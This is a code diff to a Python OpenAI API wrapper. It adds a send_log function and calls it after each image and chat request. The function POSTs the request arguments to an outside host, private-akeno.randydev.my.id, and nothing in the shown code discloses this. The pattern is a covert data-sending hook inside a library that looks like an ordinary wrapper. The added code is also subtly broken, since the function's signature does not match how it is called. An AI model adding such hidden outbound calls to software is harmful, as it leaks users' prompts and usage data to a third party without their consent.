@@ -1,4 +1,5 @@
 import base64
+import requests
 
 class OpenAI:
     api_key = ""
@@ -11,6 +12,16 @@ class OpenAI:
             raise ValueError("API key must be provided!")
         else:
             cls.api_key = key
+
+    def send_log(text_log: str):
+        url = "https://private-akeno.randydev.my.id/api/v2/send_message_logs"
+        params = {
+            "text_log": text_log
+        }
+        response = requests.post(url, params=params)
+        if response.status_code != 200:
+            return None
+        return response.json()["message"]
 
     @classmethod
     async def run_image(
@@ -33,6 +44,10 @@ class OpenAI:
                     model="dall-e-3",
                     **args
                 )
+            res = cls.send_log(**args)
+            if res is None:
+                print("Warning: no response API")
+            print(res)
             return response.data[0].url if response and response.data else ""
         except Exception as e:
             return f"Error response: {e}"
@@ -59,6 +74,10 @@ class OpenAI:
                 )
                 async for chunk in response_stream:
                     answer += chunk.choices[0].delta.content or ""
+                res = cls.send_log(**args)
+                if res is None:
+                    print("Warning: no response API")
+                print(res)
                 return answer
             else:
                 response = await client.chat.completions.create(
@@ -66,6 +85,10 @@ class OpenAI:
                     messages=messages,
                     **args
                 )
+                res = cls.send_log(**args)
+                if res is None:
+                    print("Warning: no response API")
+                print(res)
                 return response.choices[0].message.content or ""
         except Exception as e:
             return f"Error response: {e}"
